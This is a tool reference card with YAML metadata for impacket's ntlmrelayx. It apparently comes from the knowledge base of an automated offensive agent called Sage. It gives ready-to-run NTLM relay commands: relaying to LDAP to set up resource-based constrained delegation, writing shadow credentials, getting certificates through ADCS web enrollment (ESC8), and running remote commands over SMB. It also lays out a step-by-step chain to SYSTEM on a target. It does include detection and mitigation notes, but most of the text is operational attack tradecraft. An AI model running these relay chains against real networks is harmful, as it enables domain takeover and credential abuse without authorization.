---
name: ntlmrelayx
category: coercion-relay
subcategories: [ntlm-relay, ldap-relay, smb-relay, rbcd, adcs-relay]
tradecraft_tags: [ntlm-relay, impacket, ldap, smb, relay, rbcd, shadow-credentials, esc8]
mitre_attack:
  - id: T1557.001
    name: Adversary-in-the-Middle — LLMNR/NBT-NS Poisoning and SMB Relay
source:
  url: https://github.com/fortra/impacket
  license: Apache-2.0
  maintained: true
binary_type: python-script
binary_filename: ntlmrelayx.py
supported_os: [linux]
architecture: [x64]
privilege_required: none
network_required: true
detection_signal: |
  NTLM relay traffic is detectable by network monitoring — connection from a relay
  host to DC LDAP/SMB shows as a relay chain. LDAP signing enforcement blocks SMB-to-LDAP
  relay. LDAP channel binding blocks untrusted TLS client relay. LDAP writes (RBCD,
  shadow credentials) are logged (Event 5136). ESC8 relay generates CA certificate
  enrollment events.
usage_examples:
  - description: Relay to LDAP for RBCD setup
    args: "ntlmrelayx.py -t ldap://DC01.north.sevenkingdoms.local --delegate-access --no-smb-server"
  - description: Relay to LDAPS for shadow credentials
    args: "ntlmrelayx.py -t ldaps://DC01.north.sevenkingdoms.local --shadow-credentials --shadow-target 'VICTIM$'"
  - description: Relay to ADCS web enrollment (ESC8)
    args: "ntlmrelayx.py -t http://CASERVER/certsrv/certfnsh.asp --adcs --template DomainController"
  - description: Relay to SMB for file access / code execution
    args: "ntlmrelayx.py -t smb://192.168.56.22 -c 'whoami > C:\\Windows\\Temp\\out.txt'"
  - description: Relay to multiple targets simultaneously
    args: "ntlmrelayx.py -tf targets.txt -smb2support"
opsec_notes: |
  ntlmrelayx is infrastructure-side (Linux). NTLM relay requires NTLM signing to be
  disabled on the target service (LDAP by default doesn't enforce signing on older
  Windows; SMB signing is configurable). Active mitigations: LDAP signing enforcement
  (blocks LDAP relay), Extended Protection for Authentication / Channel Binding (blocks
  LDAPS relay), SMB signing (blocks SMB relay). Always check these before setting up
  relay infrastructure.
gotchas: |
  LDAP relay success depends on LDAP signing and channel binding not being enforced.
  Check: `(Get-ADObject 'CN=Default Domain Controllers Policy,...' -Properties '*').attributes`.
  RBCD relay path (`--delegate-access`) requires the relayed account to have rights to
  write `msDS-AllowedToActOnBehalfOfOtherIdentity` on the target (or the DC's default
  settings allow it). Must be combined with a coercion tool (Coercer, PetitPotam,
  SpoolSample) or Responder to capture NTLM authentication.
related_ttps: [coercer, petitpotam, spoolsample, responder, krbrelay, certify]
alternatives: [impacket-ntlmrelayx, responder-with-relay, multiRelay]
common_args:
  -t:
    description: Target URL to relay to (ldap://, ldaps://, smb://, http://)
    typical_values: ["ldap://DC01.domain.local", "ldaps://DC01.domain.local", "http://CASERVER/certsrv/..."]
    required: true
  -tf:
    description: File with list of relay targets
    typical_values: ["targets.txt"]
  --delegate-access:
    description: Configure RBCD for the relayed machine account on the target
    typical_values: [flag-only]
  --shadow-credentials:
    description: Add shadow credential (Whisker equivalent) via relayed auth
    typical_values: [flag-only]
  --shadow-target:
    description: Target account for shadow credential write
    typical_values: ["VICTIM$", "administrator"]
  --adcs:
    description: Relay to ADCS web enrollment (ESC8)
    typical_values: [flag-only]
  --template:
    description: Certificate template for ADCS relay
    typical_values: ["DomainController", "Machine"]
  -c:
    description: Command to execute (SMB relay with exec)
    typical_values: ["whoami > C:\\\\Windows\\\\Temp\\\\out.txt"]
  --no-smb-server:
    description: Disable built-in SMB server (for LDAP-only relay setups)
    typical_values: [flag-only]
  -smb2support:
    description: Enable SMBv2 support for targets
    typical_values: [flag-only]
last_updated: 2026-05-29
---

# ntlmrelayx

impacket's NTLM relay framework. ntlmrelayx intercepts NTLM authentication challenges
(from Responder, coercion tools, or any NTLM capture mechanism) and relays them to
a target service — LDAP, LDAPS, SMB, HTTP — to perform actions on behalf of the
authenticating account. The most operationally impactful relay targets are:
- LDAP: RBCD setup, shadow credentials, group membership modification
- LDAPS: Shadow credentials, certificate enrollment
- HTTP (ADCS web enrollment): ESC8 certificate issuance
- SMB: Remote command execution with the relayed account's privileges

## Typical use cases
- RBCD setup by relaying coerced machine account authentication to LDAP (`--delegate-access`)
- Shadow credential injection via LDAP relay (`--shadow-credentials`)
- ESC8 ADCS exploitation — relay to CA web enrollment to issue certificates (`--adcs`)
- SMB relay for remote code execution when NTLM signing is disabled

## How Sage uses this
ntlmrelayx is the core of Sage's NTLM relay infrastructure — it runs on the attacker's
Linux machine alongside Coercer (or Responder). The typical RBCD chain:
1. Start ntlmrelayx with `--delegate-access` targeting DC LDAP
2. Trigger coercion with Coercer/PetitPotam/SpoolSample
3. ntlmrelayx relays machine account auth → writes RBCD on target
4. Rubeus S4U chain → SYSTEM on target machine

## Output
Console output showing relay attempt results, LDAP write confirmations, and in RBCD
mode: the new machine account credentials and the Rubeus command to complete exploitation.

## Apollo-specific note
Python/Linux-only — runs on attacker infrastructure. Not Apollo-runnable. Windows-side
equivalent: KrbRelay/SharpKrbRelay for Kerberos relay without external infrastructure.

## Full Reference

> Captured against impacket v0.12.x ntlmrelayx.py, 2026-05-29.

### Key relay protocols and their prerequisites

| Protocol | Target URL | Required: Not enforced | Use case |
|----------|-----------|----------------------|---------|
| LDAP | `ldap://DC` | LDAP signing not enforced | RBCD, group add, shadow cred |
| LDAPS | `ldaps://DC` | Channel binding not enforced | Shadow cred, group add |
| SMB | `smb://HOST` | SMB signing disabled | Remote exec, file access |
| HTTP (ADCS) | `http://CA/certsrv/...` | — | ESC8 cert issuance |
| MSSQL | `mssql://HOST` | — | SQL command execution |

### Checking LDAP signing / channel binding status

```python
# Via impacket (from attacker):
ldapdomaindump -u 'DOMAIN\user' -p 'pass' DC_IP
# Look for ldapSigningRequirement and ldapChannelBindingRequirements

# Via PowerShell (from a compromised host):
Get-ADObject 'CN=Default Domain Controllers Policy,...' -Properties ldapServerIntegrity
```

### Source for this reference

- https://github.com/fortra/impacket (ntlmrelayx.py source + README)
- impacket documentation: https://impacket.readthedocs.io/
- Version: v0.12.x as of 2026-05-29
